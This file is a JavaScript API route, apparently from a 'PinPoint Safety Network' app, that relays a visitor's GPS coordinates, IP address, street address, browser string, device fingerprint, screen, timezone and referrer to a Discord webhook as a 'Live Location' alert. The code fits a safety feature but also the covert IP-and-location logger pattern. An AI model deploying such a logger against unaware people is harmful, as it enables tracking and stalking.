export async function POST(req) {
  const data = await req.json();
  const webhook = process.env.DISCORD_WEBHOOK;

  const ip =
    req.headers.get("x-forwarded-for")?.split(",")[0]?.trim() ||
    req.headers.get("x-real-ip") ||
    "unknown";

  const fields = [
    { name: "📍 Coords", value: data.lat && data.lon ? `${data.lat}, ${data.lon}` : "unavailable", inline: true },
    { name: "🎯 Accuracy", value: data.accuracy ? `${Math.round(data.accuracy)} m` : "n/a", inline: true },
    { name: "🌐 IP", value: ip, inline: true },
    { name: "🏠 Address", value: data.address || "resolving…", inline: false },
    { name: "🖥 Browser", value: data.ua || "unknown", inline: false },
    { name: "🧬 Fingerprint", value: `\`${data.fingerprint || "n/a"}\``, inline: false },
    { name: "📐 Screen", value: data.screen || "n/a", inline: true },
    { name: "🕒 Timezone", value: data.timezone || "n/a", inline: true },
    { name: "🔗 Referrer", value: data.referrer || "direct", inline: false },
  ];

  const embed = {
    title: "🚨 PINPOINT ALERT — Live Location",
    color: 0xff3b5c,
    description: `**Danger signal triggered.** Location + device data captured.`,
    fields,
    timestamp: new Date().toISOString(),
    footer: { text: "PinPoint Safety Network" },
  };

  const r = await fetch(webhook, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ embeds: [embed] }),
  });

  return Response.json({ ok: r.ok, ip });
}
